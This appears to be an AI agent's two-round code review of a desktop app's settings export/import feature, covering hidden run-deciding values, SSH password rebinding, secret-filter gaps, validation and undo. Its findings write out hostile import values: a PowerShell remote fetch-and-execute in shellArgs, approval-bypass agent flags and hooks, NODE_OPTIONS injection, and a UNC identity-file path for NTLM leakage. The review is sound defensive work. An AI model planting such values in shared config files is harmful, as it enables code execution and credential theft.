# Code review: 15c settings export / import

Scope: `git diff 22eb316 b7145a3` in `D:\kelpie-par` (branch `phase15/config-export`). Review only; no source edited.

Checks run:
- `cargo test -p kelpie -j 2 config_transfer` (CARGO_TARGET_DIR=D:\kelpie-p9-target): 12/12 pass.
- `pnpm exec vitest run src/lib/config-transfer.test.ts`: 17/17 pass.
- `pnpm i18n:check`: 0 missing, 0 problems.
- The redaction regexes (`crates/kelpie-proto/src/redact.rs`) were ported to Python to probe the edge cases.
- E2E was not run, as instructed.

## Verdict

The file contract, the strict reads, compare-before-write, backup and undo are solid. Automations can never bring in an approval, and the test hook adds no capability.

Two problems block merge. Both are in the import path when the file comes from someone else:
- **H1:** the preview hides values that decide what programs run.
- **H2:** a replaced SSH host keeps this computer's saved password, bound to whatever host name the file gives.

Four Medium findings are recommended fixes.

---

## High (blocking)

### H1. The import preview hides values that control what runs on the next launch
Where:
- `app/src/components/settings/config-transfer.tsx:96-118`: the preview shows counts, and for settings only the names of changed keys.
- `app/src/lib/config-transfer.ts:242-247` (settings) and `:261-280` (agents).
- How the values are used: `app/src/lib/store.ts:874,1501` (`shellArgs`) and `store.ts:1346-1355` (`profileLaunch`).

What a hostile file can change, and what the preview shows for it:

| Field in the file | Effect on this machine | Preview shows |
|---|---|---|
| `settings.shellArgs`, e.g. `["powershell","-NoExit","-Command","iex (iwr http://x)"]` | Element 0 is the program (`composer.tsx:67`). Runs in every new terminal. | "Changes: shellArgs" (name only) |
| `settings.agentPermissions: "yolo"` | Every agent starts with its skip-permission flags. | Key name only |
| `agents[].args` for claude/codex, e.g. `--settings '{"hooks":…}'`, `--mcp-config …`, `--dangerously-skip-permissions`, codex `-c mcp_servers.x.command=…` | Runs code on the next agent launch. | "1 in the file: 0 new, 1 replacing…" |
| `agents[].env`, e.g. `NODE_OPTIONS=--import=data:…`, `PATH=…` | Read on import with `with_values = true` (`config_transfer.rs:353`). | Nothing; only missing names are listed |
| `agents[].permission`, e.g. codex `never`, claude `bypassPermissions` | Becomes `-c approval_policy=never` or `--permission-mode bypassPermissions` (`store.ts:1349-1350`). | Nothing |
| `quickCommands[]` matching a local label (`mergeList` matches by name, `config-transfer.ts:169`) | The user's "Deploy" button now types the file's text, with Enter. | Count only |
| automation replacing a local one by name | Arrives off, but the user re-enables "their" automation without seeing the changed args, prompt or cwd. Agent actions need no approval. | Count only |

None of these needs an approval on this machine. The repository's own trust model, for MCP servers copied by agent setup (see `docs/architecture.md`, Agent setup row), requires an explicit confirmation of the argv per element, the working folder and every env entry. This import does not meet that standard. The developer report says "the preview names changed setting keys, so … yolo shows it". That is true for the key name only, and it is not true for agents at all.

Failure scenario:
1. A teammate shares `kelpie-settings.json` with `agents:[{kind:"claude", args:["--settings","{\"hooks\":{\"SessionStart\":[…command…]}}"]}]`.
2. The preview shows "Agent arguments and environment: 1 in the file: 0 new, 1 replacing".
3. The user clicks Import.
4. The next Claude session runs the command.

Fix:
- For every section the user ticked, show old → new values of the fields that decide what runs: `shellArgs`, `agentPermissions`, `agentsScripting`, profile `args`/`env`/`permission`, the text of new and replaced quick commands, and automation kind/args/prompt/cwd/command.
- Mark them as "runs programs" and require a separate tick before Import is enabled.
- Optionally: untick the agents section and the settings that run programs by default when importing.

### H2. A replaced SSH host keeps the local id, so this machine's saved password goes to the host name from the file
Where:
- `config-transfer.ts:283-291`: `mergeList` by `alias`, and `adopt` keeps the local `id`.
- `ssh_hosts.rs:453`: the password is keyed by host id.
- `crates/kelpied/src/askpass.rs:36-39`: askpass answers for the host whose `id` is preferred and whose `hostname` matches the prompt, which is now the imported hostname.
- Local `forwards` keep `host_id` (`plan.vault = {...cur.vault, hosts}`), so auto-start tunnels now go through the imported host.
- `forwardAgent`, `jump` and `startup` (typed into the remote shell) come from the file too.

Failure scenario:
1. The file has `{alias:"prod", hostname:"203.0.113.9", user:"deploy", auth:"password", forwardAgent:true}`.
2. Import replaces the local "prod" and keeps its id.
3. On connect, ssh asks to trust an unknown host key. Askpass declines unknown keys, so the user is sent to the trust flow, which they expect after an import.
4. Once trusted, askpass sends the real prod password to 203.0.113.9, and the user's agent is forwarded there.

This also happens with an honest file: "prod" on the other machine may be a different server.

The preview says only "1 replacing one with the same name". Host-key confirmation reduces the risk but does not remove it.

Fix:
- When `hostname`, `user`, `port` or `jump` differ, do not keep the local id: add the host as new, or forget its saved password.
- Show the hostname/user change in the preview.
- Do not bind local forwards to a host whose destination changed.

---

## Medium (recommended, not blocking)

### M1. The secret filter is a heuristic; some secrets reach the file, including one case the UI promises against
Where: `config_transfer.rs:38-58` (`is_secret`, `scrub`) and `:96-119` (`env_entries`).

The Python port of `redact.rs` shows these are not caught:
- **Values opted in, secret-named variables:** `DB_PASSWORD=p@ss:w0rd!` and `DB_PASSWORD=ab;cdefgh` leave `is_secret` false, because `SECRET_VALUE` stops at `: ; , ( ) & < > =`, quotes and spaces. So does `GITHUB_TOKEN="my token value"`.
  - This contradicts the UI warning "Values that look like secrets are still left out" (`config-transfer.tsx:158`) and the architecture text "never for a match".
- **Other variable names:** `SMTP_PASS`, `OPENAI_KEY` and `*_AUTH` are not in `SECRET_NAME`.
- **Arguments (exported by default, no opt-in):**
  - split form `["--api-key","c0ffee…"]` and `["--token","…"]`;
  - `--api-key=myrealkey123` (`api-key` with a hyphen does not match `API_?KEY`);
  - `--password=hunter` (no digit).
- **Quick-command and host `startup` text:** `mysql -phunter2`, `curl -u admin:hunter2`.

The settings catalog says "Passwords, tokens and keys are never written to it" (`settings-catalog.ts:106`). This overclaims.

Fix:
- Drop an env value when the name matches `SECRET_NAME`, whatever the value's shape, and widen the names (`PASS`, `_KEY$`, `AUTH`).
- In argument lists, mask the element after a flag with a secret name, and `--secret-flag=value`.
- Soften the copy to "looks like a credential". Add these cases to `no_secret_reaches_the_file…`.

### M2. Settings use the `defaultSettings` keys as the allowlist, so new settings are exported by default
Where: `config-transfer.ts:118-129`.

Any key later added to `defaultSettings` is exported and importable without anyone deciding. A secret-holding or machine-specific setting would only be caught by the `redact` heuristic. The Rust side (`config_transfer.rs:123-132`) is a denylist pass-through, and it relies on the window for the allowlist.

Fix: classify keys explicitly (portable / local / excluded), and add a unit test that fails when `defaultSettings` gains a key that is not classified.

### M3. Imported settings are checked for type only, not for allowed values or ranges
Where: `config-transfer.ts:97-116` (`shaped`).

The import accepts:
- `uiScale: 40` (`app.tsx:113`): the interface becomes unusable, including the Settings page.
- `scrollback: 1e10` (`terminal-host.ts:94`): xterm's buffer cannot be allocated, so terminals fail.
- `fontSize: 0`, `hibernateMinutes: 0`.
- `theme`, `language`, `keepAwake` or `resumeSessions` set to any string.
- `integrations.jira` with arbitrary extra string keys (the `null` default accepts any object of strings).

The settings UI clamps these values; the import bypasses it. Recovery means hand-copying `app-state.json` from the backup, and there is no restore UI.

Fix: per-key validators (enums, ranges), and fall back to the current value when a value is invalid.

### M4. One automation the daemon refuses rolls back the whole import
Where: `config-transfer.ts:394-411`; daemon checks in `crates/kelpied/src/automations.rs:335-336` and `:351-353`, `:752-760`, `:855-861`.

`automation.save` refuses:
- an agent `kind` that is not a known preset, such as a plugin or registry agent not installed here;
- a command that uses event data whose script does not exist under `cwd`, such as a repository at another path or not cloned yet;
- an invalid file glob.

Moving to another computer is exactly when these happen. Settings, hosts and every other automation are then undone with "The import failed…". The preview cannot predict it.

Fix: skip and report each refused automation (counted under `skipped`), or validate first and let the user untick. At least name the automation in the error.

---

## Low

- **L1. The copy is wrong when an approval is kept.** "Commands need approving on this computer" (`config-transfer.tsx:87,113`, user guide) is false when an import replaces an approved automation whose command is identical: `upsert` keeps it (`automations.rs:1255`). The hash also does not cover trigger glob, daily cap, schedule, `deliver` or (for shell actions) `env`, so a kept approval can come with a wider trigger. The automation arrives disabled, so this is acceptable; say so in the preview and docs.
- **L2. Lost update during apply.** `applyImport` takes the settings snapshot (`config-transfer.ts:373`) before the awaits for `config_backup` and `config_hosts_write`. A setting the user changes in that window is overwritten by `replaceSettings(plan.settings)`. Re-read `ctx.settings()` and re-merge right before `replaceSettings`, or block the settings UI while busy.
- **L3. The preview reads every section in the file** (`config-transfer.tsx:70-71`). A corrupt hosts file or a broken automation store blocks a settings-only import. Automations are dropped from the preview silently on an older daemon (the `available` filter), with no "needs a newer daemon" note.
- **L4. `read_capped` opens the path before checking its type** (`config_transfer.rs:366-370`). On unix, `File::open` on a FIFO blocks. On Windows, a `\\.\pipe\…` path connects to a named pipe. Paths come from the dialog or IPC, so the impact is minor. Check `std::fs::metadata(path)?.is_file()` before opening.
- **L5. `SETTINGS_EXCLUDED` is duplicated** in TS (`config-transfer.ts:24`) and Rust (`config_transfer.rs:30`). A comment acknowledges it; a shared test fixture would keep them in sync.
- **L6. Imported host `id`s are not checked.** `secret_key` (`ssh_hosts.rs:525`) only accepts alphanumeric ids, so a password can never be saved for a host imported with any other id. Exported ids are hex, so this only affects hand-edited files.

---

## Focus areas

### 1. Secret leakage on export: what each section writes

**settings**
- Written: the keys of `defaultSettings` minus `profiles`, `quickCommands`, `layouts`, `accounts`, `activeAccounts`, `sshConfig`, `rootYoloOk` and `skippedUpdate`, after a shape check, then `scrub`.
- No token setting exists in `Settings` today. Notify, ntfy, Telegram, phone, updater and integration tokens live in the OS store or the daemon, and the Jira/GitLab tokens are keyed by URL.
- `integrations.jira.email` is exported (PII, not a secret). A URL with a password is masked (tested).

**quickCommands**
- Written: `id`, `label`, `text`, `action`, `enter`, `projectId`; text is scrubbed (M1 gaps).

**layouts**
- Written: `id`, `name`, and the template: `kind`, `target{dest,path,port,tmux}`, `dir`, `sizes`, `children` (depth ≤8, ≤12 children).
- No secret fields.

**automations**
- Removed: `approval`, `approved_hash`, `command_*`, `last_*`, `cap_*`, `last_note`. `enabled` is forced to false.
- `env` follows the env rule. `args`, `prompt` and `argv` are scrubbed (M1 gaps for args).

**sshHosts**
- Written through the `Host` struct, so `password`, `passphrase` and `privateKey` are dropped. `os` and `lastConnected` are cleared.
- Secret `SetEnv` entries are dropped; `notes` and `startup` are scrubbed. `forwards` are excluded. The key path is kept, which is correct.

**plugins**
- Written: `id`, `name`, `version`. No approvals.

**agents**
- Written: `kind`, `label`, `args` (scrubbed, M1), `permission`, `env` as names, plus values only when opted in and not flagged (M1 gap).

**Allowlist or denylist?**
- The per-section field lists are allowlists, which is good.
- Settings keys are "every default key", so a new setting is exported by default (M2).
- The secret filter itself is a heuristic denylist (M1).

### 2. Import as an attack surface
- **Code execution without approval:** not via automations, which are always off, carry no approval, and keep an approval only for a byte-identical command (hash covers event, cwd, program, argv and script contents). It is possible via agent args/env/permission and `shellArgs`, none of which the preview shows (H1).
- **Quick commands** never run on their own; replacing one by label is H1.
- **SSH:** fields are validated by `normalize`, and `ProxyCommand` injection through hostname, user, jump or identity file is refused (tested). Credential re-binding is H2.
- **Safety switches:**
  - yolo and `agentsScripting` show their key name only (H1).
  - Update channel/URL and phone pairing are not settings.
  - `updateChecks: false` shows its key name.
- **Paths:** nothing from the file is used as a write path. Export and import paths come from the dialogs. Backups go to `<data>/backups/config-<ms>`, a fixed path.
- **File size and structure:**
  - The 2 MB cap is checked on `metadata` and again with `take` (tested).
  - `serde_json` stops at 128 levels of nesting.
  - Lists are capped at 1000 items, text at 64 KB, settings at 200 keys.
  - Unknown fields and sections are dropped and reported.

### 3. The test hook `window.__kelpie.configTransfer`
- It is exposed only when `import.meta.env.DEV` is set, or when `platform_info().e2e` is true. That flag is `KELPIE_E2E` in the app's environment at start (`lib.rs:171`, `main.tsx:22`).
- The module ships in the production lazy chunk, but nothing exposes it without that variable.
- `exportTo` and `previewImportFile` only call `config_export` and `config_import_read`. Page JS can already call those, and existing commands already reach arbitrary paths: `fs_write_file` and `fs_read_file` take a caller-chosen `root` (`fs_ops.rs:18-27,199-216`). So the hook adds no read/write capability.
- The `plugins.py` bypass (`pluginInstallFolder` → `plugin_install_folder`) uses the same gate and the same pattern.

### 4. Atomicity and undo
These are correct:
- `load_strict` treats an unreadable or corrupt `hosts.json` as an error, never as empty.
- `save_checked` compares, under the vault lock, before writing atomically.
- The automation store error stops the import (`automation.state.error`).
- `canPersist` and `saveNow` refuse when state cannot be saved.
- The backup is built in a temp folder, renamed in, and holds the whole window state, the daemon's list and a byte copy of the hosts file. The newest 5 are kept.
- Undo runs in reverse: hosts are compare-written back, settings are saved, added automations are deleted, replaced ones are saved back and re-approved by their own hash.
- On an older daemon, automations are gated by `AUTOMATION_API` (15).

Gaps:
- The re-check compares counts only. This is acceptable because apply re-plans from fresh state, but see L2.
- An undo failure is reported with the backup path, but there is no restore UI.
- The whole import fails when one automation is refused (M4).

### 5. Frontend
- Solid usage is fine: module-level signals in a singleton, keyed `Show`, `For`.
- Lazy loading through `lazy` and `Suspense`; the e2e import is dynamic and gated.
- i18n is complete.
- The preview does not make risky changes clear (H1, H2).

### 6. Tests
Covered:
- Rust: secret seeding, env opt-in, approval stripping, host credential dropping, round trip, refusal of unusable or oversized files, atomic export, backups.
- Vitest: merge counts, id keeping, env merge, undo with approval restore, unreadable current state, stale preview, `canSave`.
- E2E: the two-phase round trip.

Missing:
- M1 cases: a secret-named env value with `:;` or spaces, split `--api-key X` args, `--api-key=`.
- An import whose agent args/env, `shellArgs` or replaced quick command would run code, and what the preview shows for it.
- A host replaced with a different hostname (password binding, forwards).
- One automation refused mid-import while the others are valid (M4 behaviour).
- Out-of-range settings values (M3).
- A keyed classification test for `defaultSettings` (M2).

Status: DONE_WITH_CONCERNS
Summary: The export filtering, file checks, backup, undo and the e2e hook gating are sound, and the focused Rust (12) and Vitest (17) tests plus i18n pass. Two blocking import-safety problems remain: the preview hides values that make programs run (H1), and a replaced SSH host keeps this machine's saved password bound to the host name from the file (H2).
Concerns/Blockers: H1 and H2 block merge. M1–M4 are recommended: secret-filter gaps (one contradicts a UI promise), settings allowlist by default membership, no range/enum validation, and all-or-nothing failure when one automation is refused.

(The status block above is round 1's. Round 2 follows.)

---

# Round 2: `git diff b7145a3 71e9f7c`

Checks run (HEAD 71e9f7c, worktree clean):
- `cargo test -p kelpie -j 2 config_transfer` (CARGO_TARGET_DIR=D:\kelpie-p9-target, CARGO_INCREMENTAL=0): 18/18 pass.
- `pnpm exec vitest run src/lib/config-transfer.test.ts src/lib/layout.test.ts`: 56/56 pass.
- `pnpm typecheck`: clean.
- `pnpm i18n:check`: 0 missing.

No e2e was run, no daemon was started, and the keyring was not touched.

## Verdict

H1 and H2 are fixed; neither blocks merge any more. Every round-1 Medium and Low is addressed.

Round 2 adds two Medium findings and some Lows. None of them blocks merge:
- **R2-M1:** while an import is in progress, a moved host can still keep its password if the window closes or the hosts undo fails.
- **R2-M2:** the stricter secret filter has false positives, and a masked value overwrites this computer's working value on import.

## 1. H1: fixed

The preview now lists these values old → new, as full strings:
- **Settings:** `shellArgs`, `agentPermissions`, `agentsScripting`.
- **Agent profiles:** `args`, `permission` and each `env:<NAME>`.
- **Quick commands:** their text, with where it goes and whether Enter follows.
- **Saved layouts:** panes that start on another machine.
- **Automations:** kind, command (program and argv), args, prompt, cwd, env.
- **SSH hosts:** `startup`.

The details:
- **Display** (`config-transfer.css:14`): `<code>` with `pre-wrap` and `break-all`, so nothing is cut off and newlines show. `argvText` quotes any element with whitespace, quotes or no characters, so `["a b"]` and `["a","b"]` cannot look the same.
- **The tick gate cannot be bypassed:**
  - It is reset when a new preview opens and whenever a section is ticked or unticked (`config-transfer.tsx:116,225`).
  - The runs list can only change through those two actions, because `chosenPlan` is derived from the preview's snapshot.
  - `applyImport` enforces it again (`config-transfer.ts:534`). It also refuses unless `planShown(plan)`, which covers sections, runs and host-target changes, equals what was shown. That check runs at the start and again for settings just before `replaceSettings` (`:551`).
  - A stale preview is refused.
  - The keyboard only reaches the native checkbox and the disabled button.
- **Tests:** "needs the run check…" and "refuses when what runs differs…", plus e2e.

Fields still not listed (Low, non-blocking):
- **R2-L1. SSH `identityFile`:** for a new host, or a replaced host whose target is unchanged.
  - On Windows a UNC path (`//attacker/share/k` passes `bad()`) makes ssh open it over SMB, which can leak the user's NTLM hash once they connect.
  - Add `identityFile` (and `jump` for new hosts) to the runs list, or refuse UNC paths in `normalize`.
- **R2-L2. Automation trigger, schedule and `deliver`:**
  - `trigger` (event/glob/daily cap), `every`/`time`, `action` (agent ↔ quick) and `deliver` are not listed.
  - The automation arrives off, and the event is part of the approval hash. But a kept approval can come with a wider glob, as round-1 L1 noted.
  - Listing `trigger` would close this.
- **R2-L3. User guide:** the run-list paragraph in `docs/user-guide.md` omits "saved layouts with panes on another machine", which the UI does show.

## 2. H2: fixed, with a remaining window (R2-M1)

What is now correct:
- **What counts as moved:** user, hostname, port or jump changing (`hostTarget`).
- **What a move does:**
  - `forwardAgent` is false for new or moved hosts; a file never turns it on.
  - `os` and `lastConnected` are reset.
  - The host's forwards are dropped from the written vault, and the preview counts them.
  - `forgetPassword(id)` → `ssh_secret_set(password, id, "")` → `secret_delete("ssh-password:<id>")`.
- **Host ids:** ids with characters other than letters and digits are cleared on read (`config_transfer.rs` `ssh_host`), so the forget can always build its key.
- **Tests:** unit tests and e2e (same id, new hostname, `forwardAgent` false, forwards empty, exactly one forget recorded).

**Undo path:**
- If a step fails before the forget, the vault undo restores the old target and the password still matches it. That is correct.
- The "keeps the password" test covers this.

**R2-M1 (Medium, non-blocking). A moved host can still keep this computer's password.**

The forget runs last (`config-transfer.ts:582`), after the moved vault is written (`:545`). Askpass reads `hosts.json` at every prompt, so from that write until the forget the old password is bound to the new target. It stays bound for good in three cases:
1. **The window closes or crashes mid-import:** for example during the `automation.save` loop, which can be many RPCs.
2. **Apply fails and the hosts undo fails too:** `config_hosts_write` compares first, so a concurrent connection that runs `ssh_host_touch` (`lastConnected`) makes it refuse. The catch block never forgets anything.
3. **A forget fails part way (keyring error):** passwords already forgotten are lost while the hosts are reverted. The message then says "nothing was changed", which is wrong.

Exposure still needs the user to trust the new host key: askpass declines unknown keys.

Fix:
- Forget the moved hosts' passwords before writing the vault. A failed import then costs a password the user re-enters, never a bound one. Or at least forget in the `catch` when the hosts undo failed.
- Report forgets that already ran in `ImportFailed`.

**Out of scope, pre-existing, to verify separately:**
- `askpass::answer` falls back to any saved host whose hostname matches the prompt (`askpass.rs:38`).
- Keyboard-interactive prompts are text from the server. On an OpenSSH that does not prefix "(user@host)" (check the Windows 10 built-in 8.1), a server could ask "dev@<other saved host>'s password:" and receive that host's password.
- An import makes adding such a host easy (still behind host-key trust). Worth a separate ticket.

## 3. The e2e hook `configTransfer.replacePasswordStore`: acceptable

**Who can reach it:**
- It is a module export reached only through `window.__kelpie.configTransfer`, which is set when `import.meta.env.DEV` or `platform_info().e2e` (the `KELPIE_E2E` environment variable at app start) is true (`main.tsx:22`, `lib.rs:171`).
- The production lazy chunk contains the function but nothing calls it.
- Plugins are declarative, with no JS.
- Page script that could reach it could equally call `config_hosts_write` or skip the forget through IPC, so it adds no capability.
- A production user cannot skip the forget: the UI always uses the default `ssh_secret_set`.

**The earlier incident:** from the code, a forget in an e2e app can only target that endpoint's own entries:
- `ssh_secret_set` → `secret_key("password", id)`, which takes letters and digits only, giving the key `ssh-password:<id>`.
- `kelpie_proto::secret_delete` deletes under `[keyring_service(), keyring_service_named("Erka")]` (`kelpie-proto/src/lib.rs:263-272,297-304`). Both read `KELPIE_ENDPOINT` from the app's process at call time and become `"Kelpie (<endpoint>)"` / `"Erka (<endpoint>)"`.
- The bare `"Kelpie"` service is used only when the variable is unset or empty. No code calls `set_var` or `remove_var` on it.
- The e2e sets a non-empty `kelpie-config-export-<pid>-{a,b}` in its own process before starting tauri-driver, and asserts it. The disclosed incident hitting `Kelpie (kelpie-config-export-<pid>-b)` shows it was inherited.
- That same variable routes the app to the test daemon. An app without it would talk to the real daemon, which the script already guards against.
- The key used the id of phase B's freshly created host (random hex), so even under the real service it would not match a real entry.
- So the user's real "Kelpie" entries cannot be reached.

**R2-L4 (Low):**
- The recorder is installed once, at phase start.
- A page reload before the Import click would bring back the real forget. It would still be isolated by the service name, but a guard would be nice.
- Re-check `Array.isArray(window.__secretCalls)` just before `apply-import`.
- Optionally assert that the app's keyring service is not the bare "Kelpie".

## 4. M1–M4 and the Lows

**M1: fixed**
- `secret_name` drops values of secret-named variables (`DB_PASSWORD=p@ss:w0rd!` included), on export and on import.
- `mask_args` masks the value after a secret flag and `--flag=value`.
- `mask_text` covers flags in text, `mysql -p`, `curl -u`, and upper-case `NAME=value`.
- SSH `SetEnv` secret names are dropped.
- The copy is softened. Each case has a Rust test.

**R2-M2 (Medium, non-blocking). False positives, and masked values overwrite working local values.**

`secret_name` matches a name part that ends with a secret word. This catches ordinary names:
- `--dangerously-bypass-approvals-and-sandbox` (part `BYPASS` ends with `PASS`) masks the next argument when it is not a flag.
- `--session-id <uuid>` and `--no-session-persistence` (SESSION) do the same.
- `-c model_providers.x.env_key=OPENAI_API_KEY` becomes `env_key=[redacted]`.
- `XDG_SESSION_TYPE=x11` is masked in text.

The read path cleans the file the same way. So importing your own export onto a computer that has `["--api-key","realkey"]` writes `["--api-key","[redacted]"]` over it, and the agent breaks. The run list shows the change, so it is visible.

Fix:
- When an incoming value contains `[redacted]`, keep this computer's value (as name-only env entries already do), or leave that item out and name it.
- Match `PASS` and `KEY` only as a whole name part, or exempt `BYPASS`.

**M2: fixed**
- `settings-transfer.json` (`exported`/`excluded`) is the one source:
  - Rust reads it with `include_str!("../../src/lib/settings-transfer.json")`, and the path resolves to `app/src/lib`;
  - TS imports it.
- The Vitest "every default setting in exactly one list" test and the Rust "only classified keys" test pass.
- `default-settings.ts` imports only types. `store.ts` imports it and re-exports it, with the same object, so there is no import cycle and no behaviour change.
- The old duplicate exclusion list is gone.

**M3: fixed**
- `RULES` covers the numeric ranges and every enum. `uiScale` is limited to the four page choices. `integrations` is reduced to `{url, email}`.
- Lists are capped at 500 strings.
- Invalid and unknown keys are named in the preview.
- The ranges match the UI where checked (right panel 200–700, as in `right-panel.tsx:51`).

**M4: fixed, with one case misreported (R2-L5)**
- When the daemon refuses an automation, `automation.state` is called. If that answers, the automation is skipped and reported; if not, the error is rethrown and everything is undone.
- **Daemon down:** undo also fails for daemon steps. Those are reported together with the backup path, and hosts and settings are undone. Acceptable.
- **R2-L5 (Low):** `AutomationStore::upsert` (`automations.rs:1267-1282`, pre-existing) changes the in-memory list before `save()`.
  - A write error (disk full, ACL) leaves the daemon's state not "broken", yet holding the imported version in memory: it replaces the user's automation, or adds a new one.
  - The import reports it as "Not imported, refused here" and registers no undo, and a later daemon save persists it.
  - Fix: after a refusal, re-list. If the id is present with the imported content, treat it as a failure and undo; for a replaced item, register the undo anyway. Or fix `upsert` to roll back when `save()` fails.

**Round-1 Lows**
- **L1:** the copy is corrected.
- **L2:** settings are re-read and re-planned before `replaceSettings`; tested.
- **L3:** `loadForPreview` reads each section on its own and shows unreadable ones as unavailable; tested.
- **L4:** `metadata` is checked before opening.
  - **R2-L6 (residual):** on Windows, `std::fs::metadata` itself opens the path (`CreateFileW`, no access rights), so a `\\.\pipe\…` path still connects to the pipe for a moment and then fails `is_file`. Harmless. Refuse paths that start with `\\.\` or `\\?\pipe` to close it fully.
- **L5:** one shared list.
- **L6:** non-alphanumeric ids are reset.

## Round 2 summary

| ID | Severity | Blocking | Item |
|---|---|---|---|
| H1 | — | no (fixed) | Run-deciding values shown old → new behind a tick, enforced at apply |
| H2 | — | no (fixed) | Moved host: password forgotten, agent forwarding off, forwards removed |
| R2-M1 | Medium | no | A moved host can still keep its password (window closed or crash mid-import, hosts undo refused, partial forget) |
| R2-M2 | Medium | no | Filter false positives (`BYPASS`, `SESSION`, `env_key`); `[redacted]` overwrites working local args |
| R2-L1 | Low | no | `identityFile` (UNC → NTLM on Windows) not in the run list |
| R2-L2 | Low | no | Automation trigger, schedule and deliver not in the run list |
| R2-L3 | Low | no | User guide omits remote layout panes from the run list |
| R2-L4 | Low | no | E2E recorder not re-checked right before Import |
| R2-L5 | Low | no | A daemon write failure is reported as "refused" while memory holds the imported automation (pre-existing `upsert`) |
| R2-L6 | Low | no | Windows `metadata` still opens pipe paths for a moment |

Status: DONE_WITH_CONCERNS
Summary: Round 2 fixes H1 and H2 and every round-1 Medium and Low. Focused tests pass (Rust 18, Vitest 56, typecheck, i18n), and the test hook cannot reach the real credential store. Nothing blocks merge.
Concerns/Blockers: No blockers. Recommended before release: R2-M1 (forget the passwords before writing the vault, or in the failure path) and R2-M2 (keep the local value when the incoming one is masked, and narrow `PASS`/`SESSION`). Pre-existing, separate ticket: askpass answering with another saved host's password when the server writes the prompt.
